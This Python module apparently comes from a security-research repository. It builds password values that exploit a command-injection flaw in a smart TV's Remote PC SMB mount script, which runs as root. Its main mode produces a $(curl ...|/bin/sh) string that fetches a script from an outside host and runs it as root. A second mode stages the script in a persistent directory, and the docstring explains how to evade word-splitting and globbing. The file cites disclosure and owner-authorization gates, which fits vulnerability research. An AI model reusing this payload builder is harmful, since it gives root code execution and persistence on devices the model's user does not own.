#!/usr/bin/env python3
"""Build the Remote PC password payload that stages the persistent-root setup.

Assessed source-to-sink on GQ55Q60TGUXZG / T-NKLDEUC-2743.0 (see
``research/remotepc-cifs-root/DISCLOSURE.md`` and the private
``smbpath-script`` notes this module reuses):

    remotepc_uilauncher writes a temp credential file with raw lines:
        username=<input>
        password=<input>
        smbpath="<selected SMB share name>"
    mount.smb.sh read_credentials() deletes the smbpath line, word-splits the
    rest on IFS, joins the words with commas, substitutes the result for the
    `credentials=<file>` token, and finally runs:
        [[ "$debug" == "false" ]] && /bin/bash -c "$UTIL $UTIL_OPT"
    as root.

Design rules the sink imposes on the password value (proven by the tracked
canary grammar and the offline negative controls):

1. One line, no literal whitespace: use ``${IFS}`` for separators.
2. No glob metacharacters (``* ? [ ]``): the same substitution is globbed.
3. Wrap the action in ``$( ... )`` and keep stdout empty so the mount argument
   survives; the delivered script must therefore print nothing on stdout.
4. 160 bytes is the reviewed bound (the only length proven to authenticate
   through PAM and SMB unchanged).

Two shapes are supported:

- ``pipe`` (default): ``curl | /bin/sh`` — the setup script runs directly as
  root, no file is written first. Smallest proven shape.
- ``fetch``: ``curl -o <path>`` writes the script into the persistent
  ``sdk_tools`` directory without executing it. For an authorized manual
  inspection flow only.

This module only builds values. It never talks to a device. Live use requires
the exact owner TV, the harness target gates, and the authorization phrases in
``README.md``.
"""

from __future__ import annotations

import re
from dataclasses import asdict, dataclass

# Assessed sink pin (must equal the tracked research pin and the repro fixture).
MOUNT_SMB_SHA256 = "37aaf2f05bf714332a6bf8f14b543ac9584a1b9a051341674a74fc0dd753c57e"

# Proven upstream bound: the tracked canary password (160 bytes) is the only
# length that has authenticated through PAM and SMB unchanged.
REVIEWED_BOUND = 160
IFS = "${IFS}"

DEFAULT_SCRIPT_DIR = "/home/owner/share/tmp/sdk_tools"
DEFAULT_PORT = 18080
DEFAULT_PATH = "/d"
DEFAULT_TOKEN = "0" * 16

TOKEN_RE = re.compile(r"[0-9a-f]{16}")
GLOB_RE = re.compile(r"[*?\[\]]")
WHITESPACE_RE = re.compile(r"[\s]")
IPV4_RE = re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")


@dataclass(frozen=True)
class PasswordPayload:
    """One exact password value plus the facts a live run must check."""

    mode: str
    host_ip: str
    port: int
    http_path: str
    script_path: str
    password: str
    password_length: int
    reviewed_bound: int
    over_bound: bool
    inner_command: str

    def as_dict(self) -> dict[str, str | int | bool]:
        return asdict(self)


def validate(password: str) -> None:
    """Refuse anything the sink would corrupt or evaluate outside the wrap."""
    if not password.startswith("$(") or not password.endswith(")"):
        raise ValueError("payload must be one $( ... ) command substitution")
    if WHITESPACE_RE.search(password):
        raise ValueError("payload contains whitespace; join_by would comma-split it")
    if GLOB_RE.search(password):
        raise ValueError("payload contains glob characters; the sink globs it")
    if "`" in password:
        raise ValueError("payload contains a backtick; the sink treats it as syntax")
    if "\x00" in password:
        raise ValueError("payload contains a NUL")
    if "\n" in password or "\r" in password:
        raise ValueError("payload must be one line")
    if len(password.encode("ascii")) > REVIEWED_BOUND:
        raise ValueError(f"payload is {len(password.encode('ascii'))} bytes, over {REVIEWED_BOUND}")


HTTP_PATH_RE = re.compile(r"[A-Za-z0-9/._~-]+")


def require_host(host_ip: str, port: int, http_path: str) -> None:
    canonical_ipv4(host_ip)
    if not (1 <= port <= 65535):
        raise ValueError("port out of range")
    # The path is inserted into the command unquoted inside $(), so anything
    # with shell meaning (& ; | ) etc.) would split or break the command.
    if not http_path.startswith("/") or not HTTP_PATH_RE.fullmatch(http_path):
        raise ValueError("http_path must be /[A-Za-z0-9/._~-]+")


def canonical_ipv4(host_ip: str, label: str = "host_ip") -> str:
    """Parse a strict IPv4 literal (999.x is rejected) and return it canonical."""
    if not IPV4_RE.fullmatch(host_ip):
        raise ValueError(f"{label} must be a dotted-quad IPv4 literal")
    import ipaddress

    try:
        address = ipaddress.IPv4Address(host_ip)
    except ipaddress.AddressValueError as error:
        raise ValueError(f"{label} must be a dotted-quad IPv4 literal") from error
    if str(address) != host_ip:
        raise ValueError(f"{label} must be a canonical IPv4 literal")
    return host_ip


def _wrap(inner: str) -> str:
    password = f"$({inner})"
    validate(password)
    return password


def build_pipe_password(
    *,
    host_ip: str,
    port: int = DEFAULT_PORT,
    http_path: str = DEFAULT_PATH,
    bin_prefix: str = "/usr/bin/",
) -> PasswordPayload:
    """``curl | /bin/sh`` — run the served setup script directly as root."""
    require_host(host_ip, port, http_path)
    if bin_prefix and not bin_prefix.endswith("/"):
        raise ValueError("bin_prefix must end with a slash")
    inner = (
        f"{bin_prefix}curl{IFS}-qfsS{IFS}--proto{IFS}=http{IFS}-m{IFS}30"
        f"{IFS}http://{host_ip}:{port}{http_path}|/bin/sh"
    )
    password = _wrap(inner)
    return PasswordPayload(
        mode="pipe",
        host_ip=host_ip,
        port=port,
        http_path=http_path,
        script_path="",
        password=password,
        password_length=len(password.encode("ascii")),
        reviewed_bound=REVIEWED_BOUND,
        over_bound=len(password.encode("ascii")) > REVIEWED_BOUND,
        inner_command=inner,
    )


def build_fetch_password(
    *,
    host_ip: str,
    script_name: str,
    script_dir: str = DEFAULT_SCRIPT_DIR,
    port: int = DEFAULT_PORT,
    http_path: str = DEFAULT_PATH,
    chmod: bool = False,
    bin_prefix: str = "/usr/bin/",
) -> PasswordPayload:
    """``curl -o`` — stage the setup script into the persistent sdk_tools dir.

    The cd-relative shape (reuse the one proven by the tracked offline chunking
    repro) keeps the long sdk_tools directory out of the byte budget, so the
    whole payload — including an optional chmod — fits the reviewed bound.
    """
    require_host(host_ip, port, http_path)
    if not script_dir.startswith("/"):
        raise ValueError("script_dir must be absolute")
    if WHITESPACE_RE.search(script_dir) or GLOB_RE.search(script_dir):
        raise ValueError("script_dir must not contain whitespace or glob characters")
    name = script_name if re.fullmatch(r"[A-Za-z0-9._-]{1,32}", script_name or "") else ""
    if not name or not script_name:
        raise ValueError("script_name must be a safe basename of at most 32 characters")
    if bin_prefix and not bin_prefix.endswith("/"):
        raise ValueError("bin_prefix must end with a slash")
    parts = [
        f"cd{IFS}{script_dir}",
        f"{bin_prefix}curl{IFS}-fso{name}{IFS}http://{host_ip}:{port}{http_path}",
    ]
    if chmod:
        parts.append(f"{bin_prefix}chmod{IFS}755{IFS}{name}")
    inner = "&&".join(parts)
    password = _wrap(inner)
    return PasswordPayload(
        mode="fetch",
        host_ip=host_ip,
        port=port,
        http_path=http_path,
        script_path=f"{script_dir}/{name}",
        password=password,
        password_length=len(password.encode("ascii")),
        reviewed_bound=REVIEWED_BOUND,
        over_bound=len(password.encode("ascii")) > REVIEWED_BOUND,
        inner_command=inner,
    )


def main() -> int:
    import argparse
    import json

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host-ip", required=True, help="this Mac's LAN address")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--http-path", default=DEFAULT_PATH)
    parser.add_argument("--mode", choices=("pipe", "fetch"), default="pipe")
    parser.add_argument("--script-dir", default=DEFAULT_SCRIPT_DIR)
    parser.add_argument("--script-name", default=None, help="fetch mode basename (default: token-based)")
    parser.add_argument("--chmod", action="store_true", help="fetch mode: also set mode 0755")
    args = parser.parse_args()
    if args.mode == "fetch":
        name = args.script_name or f"p{DEFAULT_TOKEN}.sh"
        payload_value = build_fetch_password(
            host_ip=args.host_ip, port=args.port, http_path=args.http_path,
            script_dir=args.script_dir, script_name=name, chmod=args.chmod,
        )
    else:
        if args.chmod:
            parser.error("--chmod applies to --mode fetch")
        payload_value = build_pipe_password(host_ip=args.host_ip, port=args.port, http_path=args.http_path)
    print(json.dumps(payload_value.as_dict(), indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
